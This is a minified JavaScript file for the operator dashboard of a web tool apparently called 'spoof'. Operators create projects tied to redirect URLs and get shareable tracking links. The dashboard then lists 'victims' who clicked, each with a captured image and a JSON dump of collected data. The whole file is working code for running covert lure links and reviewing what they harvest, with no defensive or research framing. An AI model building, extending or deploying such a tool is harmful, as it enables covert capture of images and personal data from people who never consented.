const projectFormContainer=document.querySelector(".project__form__container"),newProjectButton=document.querySelector("#new-project"),projectForm=document.getElementById("project-form"),projectFormClose=document.querySelector("#project-form-close"),nameField=document.getElementById("projectName"),urlField=document.getElementById("redirectURL"),alertBox=document.getElementById("message"),logoutButton=document.getElementById("logout"),greet=document.querySelector("#greet"),projectCount=document.querySelector("#project-count"),projectsContainer=document.querySelector(".projects__list"),projectInfo=document.querySelector(".project__info"),victimsCount=document.querySelector("span#victims-count"),victimsContainer=document.querySelector(".victims__list"),victimContainer=document.querySelector(".victim__container");var PROJECTS,VICTIMS,USER,USER_DIV,timeout;const getSharingURL=e=>` ${window.location.origin}/redirect?r_id=${e}&u_id=${USER}`;async function request(e,t,o){const n=localStorage.getItem("accessToken"),r=localStorage.getItem("username");if(n)try{const i=await fetch(e,{method:t,headers:{Authorization:`Bearer ${n}`,"Content-Type":"application/json","Custom-Username":r},body:JSON.stringify(o)});if(!i.ok)return null;return await i.json()}catch(e){console.log("error fetching data",e)}}const toggleForm=()=>{projectFormContainer.classList.toggle("visible")},isValidUrl=e=>{try{return new URL(e),!0}catch(e){return!1}},createProject=async e=>{e.preventDefault();const t=nameField.value,o=urlField.value;if(!t||!o)return;if(!isValidUrl(o))return alertBox.innerText="Enter valid url",alertBox.parentElement.classList.add("visible"),timeout&&(clearTimeout(timeout),timeout=null),void(timeout=setTimeout((()=>{alertBox.parentElement.classList.remove("visible")}),2e3));const n={name:t,url:o},r=await request("/spoof/dashboard/api/project","POST",n);r.success&&(alertBox.textContent=r.message,alertBox.parentElement.classList.add("visible"),setTimeout((()=>{window.location.reload()}),2e3))},expandVictim=e=>{victimContainer.innerHTML="",USER_DIV=document.createElement("div");const t=VICTIMS.find((t=>t.victim_id===e)),o=document.createElement("img");o.src=t.userImages;var n=document.createElement("div");n.classList.add("jsontreej_tree__wrapper","slick__scroll");jsonTree.create(t,n);USER_DIV.appendChild(o),USER_DIV.appendChild(n),victimContainer.appendChild(USER_DIV)},showVictims=async e=>{const t=await request("/spoof/dashboard/api/victims?projectId="+e,"GET");t.success&&(VICTIMS=t.victims,victimsContainer.innerHTML="",victimsCount.textContent=VICTIMS.length,VICTIMS.forEach((e=>{const t=document.createElement("a");t.setAttribute("victim_id",e.victim_id),t.classList.add("victims__list__item");const o=e.userImages?"/images/"+e.userImages:"/images/user-flat.png";e.userImages=o;const n=`\n    <div>\n      <img src="${o}">\n      <p>Date: ${new Date(e.date_created).toLocaleString()}</p>\n    </div>\n    `;t.innerHTML=n,t.onclick=o=>{document.querySelector(".victims__list__item.active")?.classList.remove("active"),t.classList.add("active"),expandVictim(e.victim_id)},victimsContainer.appendChild(t)})))},showProjects=()=>{PROJECTS.map((e=>{const{date_created:t,name:o,url:n,project_id:r}=e,i=new Date(t).toDateString(),c=o.toUpperCase(),s=document.createElement("a");s.classList.add("projects__list__item");const a=`\n    <div>\n      <p>${c}</p>\n      <span>${i}</span>\n    </div>\n    `;s.innerHTML=a,s.setAttribute("project_id",r),s.onclick=e=>{var t;victimContainer.innerHTML="",document.querySelector(".projects__list__item.active")?.classList.remove("active"),s.classList.add("active"),projectInfo.innerHTML=`\n      <p><strong>Name: </strong>${c}</p>\n      <p><strong>Created On: </strong>${i}</p>\n      <p><strong>URL: </strong>${n}</p>\n      <p><strong>Sharing Link: </strong> ${t=r,` ${window.location.origin}/redirect?r_id=${t}&u_id=${USER}`}</p>\n      `,showVictims(r)},projectsContainer.appendChild(s)}))},logoutUser=async e=>{e.preventDefault();(await request("/spoof/api/logout","POST")).success&&(localStorage.removeItem("accessToken"),localStorage.removeItem("username"),window.location.href="/spoof/login")};async function Start(){const e=await request("/spoof/dashboard/api/data","GET");if(!e)return;const{message:t,projects:o,username:n}=e;PROJECTS=o,USER=n,greet.textContent=t,projectCount.textContent=o.length,projectForm.onsubmit=createProject,projectFormClose.onclick=toggleForm,newProjectButton.onclick=toggleForm,logoutButton.onclick=logoutUser,PROJECTS.map((e=>{const{date_created:t,name:o,url:n,project_id:r}=e,i=new Date(t).toDateString(),c=o.toUpperCase(),s=document.createElement("a");s.classList.add("projects__list__item");const a=`\n    <div>\n      <p>${c}</p>\n      <span>${i}</span>\n    </div>\n    `;s.innerHTML=a,s.setAttribute("project_id",r),s.onclick=e=>{var t;victimContainer.innerHTML="",document.querySelector(".projects__list__item.active")?.classList.remove("active"),s.classList.add("active"),projectInfo.innerHTML=`\n      <p><strong>Name: </strong>${c}</p>\n      <p><strong>Created On: </strong>${i}</p>\n      <p><strong>URL: </strong>${n}</p>\n      <p><strong>Sharing Link: </strong> ${t=r,` ${window.location.origin}/redirect?r_id=${t}&u_id=${USER}`}</p>\n      `,showVictims(r)},projectsContainer.appendChild(s)}))}Start();